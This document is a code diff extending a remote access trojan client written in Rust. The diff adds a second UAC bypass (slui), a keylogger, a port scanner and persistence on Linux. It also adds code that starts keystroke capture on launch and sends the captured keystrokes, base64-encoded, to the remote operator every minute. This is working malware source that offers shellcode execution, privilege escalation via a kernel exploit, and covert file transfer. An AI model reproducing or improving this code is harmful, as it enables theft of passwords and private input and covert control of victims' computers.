@@ -1,11 +1,12 @@
 #[cfg(target_os = "windows")]
-mod uac_bypass;
+pub mod uac_bypass;
 #[cfg(target_os = "windows")]
 mod amsi_patch;
 #[cfg(target_os = "windows")]
-mod kernel_exploit;
-#[cfg(target_os = "windows")]
-mod persist;
+pub mod kernel_exploit;
+pub mod persist;
+pub mod keylogger;
+pub mod portscanner;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
 
@@ -26,17 +27,13 @@ fn cleanup_temp_dirs() {
         guard.take();
     }
 }
-#[cfg(target_os = "windows")]
-use libc::malloc;
 use tor_rtcompat::PreferredRuntime;
 use tokio::io::split;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::process::Command;
-use anyhow::{Result, Context, anyhow};
+use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
-#[cfg(target_os = "windows")]
-use zstd::zstd_safe::OutBuffer;
 use std::fs;
 use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
@@ -50,9 +47,6 @@ use screenshots::image::ImageOutputFormat;
 
 
 
-
-#[cfg(target_os = "windows")]
-use std::os::windows::process::CommandExt;
 
 #[cfg(target_os = "windows")]
 use winapi::um::memoryapi::VirtualAlloc;
@@ -219,7 +213,12 @@ Available commands:
     `upload [filename]`=>\tUpload file to the server
     `download [filename]`=>\tDownload file from the server
     `shellcode [file]`=>\tExecute shellcode from file
-    `uac [exe_path]`=>\tRun elevated command on Windows
+    `uac [exe_path]`=>\tRun elevated command on Windows (cmstp)
+    `uac2 [exe_path]`=>\tRun elevated command on Windows (slui)
+    `keylogger_start`=>\tStart keylogger in background
+    `keylogger_stop`=>\tStop keylogger
+    `keylogger_dump`=>\tDump and clear buffered keystrokes
+    `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
 
     ").into_bytes())
         }
@@ -302,7 +301,7 @@ Available commands:
                 }
 
                 let payload = args.join(" ");
-                crate::uac_bypass::elevate_uac(&payload);
+                uac_bypass::elevate_uac(&payload);
 
                 Ok(format!("Triggered UAC with payload: {}\n", payload).into_bytes())
             }
@@ -310,6 +309,78 @@ Available commands:
             #[cfg(not(target_os = "windows"))]
             {
                 Ok(b"uac not supported on this OS\n".to_vec())
+            }
+        }
+
+        "uac2" => {
+            #[cfg(target_os = "windows")]
+            {
+                if args.is_empty() {
+                    return Ok(b"uac2: missing argument\n".to_vec());
+                }
+
+                let payload = args.join(" ");
+                uac_bypass::uac_slui(&payload);
+
+                Ok(format!("Triggered UAC (slui) with payload: {}\n", payload).into_bytes())
+            }
+
+            #[cfg(not(target_os = "windows"))]
+            {
+                Ok(b"uac2 not supported on this OS\n".to_vec())
+            }
+        }
+
+        "keylogger_start" => {
+            keylogger::start();
+            Ok(b"Keylogger started\n".to_vec())
+        }
+
+        "keylogger_stop" => {
+            keylogger::stop();
+            Ok(b"Keylogger stopped\n".to_vec())
+        }
+
+        "keylogger_dump" => {
+            let data = keylogger::dump_and_clear();
+            let encoded = general_purpose::STANDARD.encode(data.as_bytes());
+            Ok(format!("[keylog] {}\n", encoded).into_bytes())
+        }
+
+        "portscan" => {
+            let protocol = args.get(0).ok_or_else(|| anyhow!("portscan: missing protocol"))?.to_lowercase();
+            let host = args.get(1).ok_or_else(|| anyhow!("portscan: missing host"))?.to_string();
+            let fast = args.contains(&"--fast");
+
+            let ports: Vec<u16> = if fast {
+                portscanner::COMMON_PORTS.to_vec()
+            } else {
+                (1..=65535).collect()
+            };
+
+            let total = ports.len();
+            let msg = format!("Scanning {} ports on {} ({})...\n", total, host, protocol);
+            let scan_type = protocol.as_str();
+
+            let open = match scan_type {
+                "tcp" => portscanner::scan_tcp(&host, &ports).await,
+                "udp" => portscanner::scan_udp(&host, &ports).await,
+                "sctp" => {
+                    #[cfg(unix)]
+                    { portscanner::scan_sctp(&host, &ports).await }
+                    #[cfg(not(unix))]
+                    { return Err(anyhow!("SCTP scan not supported on this OS")); }
+                }
+                _ => return Err(anyhow!("portscan: unknown protocol '{}' (use tcp, udp, or sctp)", protocol)),
+            };
+
+            if open.is_empty() {
+                Ok(format!("{}No open ports found on {}\n", msg, host).into_bytes())
+            } else {
+                Ok(format!("{}Open ports on {} ({}): {}\n",
+                    msg, host, protocol,
+                    open.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", ")
+                ).into_bytes())
             }
         }
 
@@ -406,75 +477,95 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
     writer.write_all(build_prompt().as_bytes()).await?;
     writer.flush().await?;
 
+    let mut keylog_tick = tokio::time::interval(Duration::from_secs(60));
+    keylog_tick.tick().await;
+
     loop {
-        let n = reader.read(&mut buf).await?;
+        tokio::select! {
+            result = reader.read(&mut buf) => {
+                let n = result?;
 
-        if n == 0 {
-            println!("Connection closed by remote");
-            return Ok(false);
-        }
+                if n == 0 {
+                    println!("Connection closed by remote");
+                    return Ok(false);
+                }
 
-        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));
+                buffer.push_str(&String::from_utf8_lossy(&buf[..n]));
 
-        while let Some(pos) = buffer.find('\n') {
-            let mut line = buffer[..pos].to_string();
-            buffer.drain(..=pos);
+                while let Some(pos) = buffer.find('\n') {
+                    let mut line = buffer[..pos].to_string();
+                    buffer.drain(..=pos);
 
-            line = line.trim().to_string();
+                    line = line.trim().to_string();
 
-            if line.starts_with("download-start ") {
-                let parts: Vec<&str> = line.splitn(2, ' ').collect();
-                dl_filename = Some(parts.get(1).unwrap_or(&"unknown").to_string());
-                dl_data.clear();
-                continue;
-            }
-
-            if dl_filename.is_some() {
-                if line.starts_with("download-chunk ") {
-                    let parts: Vec<&str> = line.splitn(2, ' ').collect();
-                    if let Some(chunk) = parts.get(1) {
-                        dl_data.push_str(chunk);
+                    if line.starts_with("download-start ") {
+                        let parts: Vec<&str> = line.splitn(2, ' ').collect();
+                        dl_filename = Some(parts.get(1).unwrap_or(&"unknown").to_string());
+                        dl_data.clear();
+                        continue;
                     }
-                    continue;
-                }
-                if line == "download-end" {
-                    let fname = dl_filename.take().unwrap();
-                    let raw = general_purpose::STANDARD.decode(&dl_data)?;
-                    fs::write(&fname, &raw)?;
-                    let msg = format!("Wrote data to {}\n", fname);
-                    writer.write_all(msg.as_bytes()).await?;
-                    writer.write_all(build_prompt().as_bytes()).await?;
-                    writer.flush().await?;
-                    continue;
-                }
-                dl_filename = None;
-                dl_data.clear();
-            }
 
-            if line.is_empty() {
+                    if dl_filename.is_some() {
+                        if line.starts_with("download-chunk ") {
+                            let parts: Vec<&str> = line.splitn(2, ' ').collect();
+                            if let Some(chunk) = parts.get(1) {
+                                dl_data.push_str(chunk);
+                            }
+                            continue;
+                        }
+                        if line == "download-end" {
+                            let fname = dl_filename.take().unwrap();
+                            let raw = general_purpose::STANDARD.decode(&dl_data)?;
+                            fs::write(&fname, &raw)?;
+                            let msg = format!("Wrote data to {}\n", fname);
+                            writer.write_all(msg.as_bytes()).await?;
+                            writer.write_all(build_prompt().as_bytes()).await?;
+                            writer.flush().await?;
+                            continue;
+                        }
+                        dl_filename = None;
+                        dl_data.clear();
+                    }
+
+                    if line.is_empty() {
+                        writer.write_all(build_prompt().as_bytes()).await?;
+                        writer.flush().await?;
+                        continue;
+                    }
+
+                    if line == "exit" || line == "quit" || line == "/quit" {
+                        writer.write_all(b"Goodbye\n").await?;
+                        writer.flush().await?;
+                        return Ok(true);
+                    }
+
+                    match run_command(&line).await {
+                      Ok(output) => {
+                      writer.write_all(&output).await?;
+                      }
+                      Err(e) => {
+                        let err_msg = format!("ERROR: {}\n", e);
+                        writer.write_all(err_msg.as_bytes()).await?;
+                    }
+                }
+
                 writer.write_all(build_prompt().as_bytes()).await?;
                 writer.flush().await?;
-                continue;
+                }
             }
-
-            if line == "exit" || line == "quit" || line == "/quit" {
-                writer.write_all(b"Goodbye\n").await?;
-                writer.flush().await?;
-                return Ok(true);
+            _ = keylog_tick.tick() => {
+                if keylogger::is_running() {
+                    let data = keylogger::dump_and_clear();
+                    if !data.is_empty() {
+                        let encoded = general_purpose::STANDARD.encode(data.as_bytes());
+                        let msg = format!("[keylog] {}\n{}", encoded, build_prompt());
+                        if writer.write_all(msg.as_bytes()).await.is_err() {
+                            return Ok(false);
+                        }
+                        writer.flush().await.ok();
+                    }
+                }
             }
-
-            match run_command(&line).await {
-              Ok(output) => {
-              writer.write_all(&output).await?;
-              }
-              Err(e) => {
-                let err_msg = format!("ERROR: {}\n", e);
-                writer.write_all(err_msg.as_bytes()).await?;
-    }
-}
-
-writer.write_all(build_prompt().as_bytes()).await?;
-writer.flush().await?;
         }
     }
 }
@@ -535,15 +626,29 @@ async fn netclient_impl() -> c_int {
         unsafe {
             kernel_exploit::exploit();
         }
+        let marker = std::env::temp_dir().join("art1rat_uac.tmp");
+        let _ = fs::write(&marker, b"1");
         uac_bypass::elevate_uac(&exe_str);
-        return 1;
+        sleep(Duration::from_secs(5)).await;
+        if marker.exists() {
+            let _ = fs::remove_file(&marker);
+        } else {
+            return 1;
+        }
     }
     #[cfg(target_os = "windows")]
-    persist::persist(IS_DLL);
-    #[cfg(target_os = "windows")]
-    if !is_elevated(){
-        sleep(Duration::from_secs(61)).await;
+    {
+        let marker = std::env::temp_dir().join("art1rat_uac.tmp");
+        let _ = fs::remove_file(&marker);
+        let _ = persist::persist(IS_DLL);
+        if !is_elevated(){
+            sleep(Duration::from_secs(61)).await;
+        }
     }
+    #[cfg(target_os = "linux")]
+    persist::persist(false);
+    keylogger::start();
+    sleep(Duration::from_millis(100)).await;
     let _ = netclient_run(ClientConfig::default()).await;
     cleanup_temp_dirs();
     return 0;
@@ -553,6 +658,7 @@ pub async fn netclient() -> c_int {
     netclient_impl().await
 }
 
+#[allow(non_snake_case)]
 #[unsafe(export_name = "NetClientMain")]
 pub extern "C" fn NetClientMain() -> c_int {
     let rt = tokio::runtime::Runtime::new().unwrap();
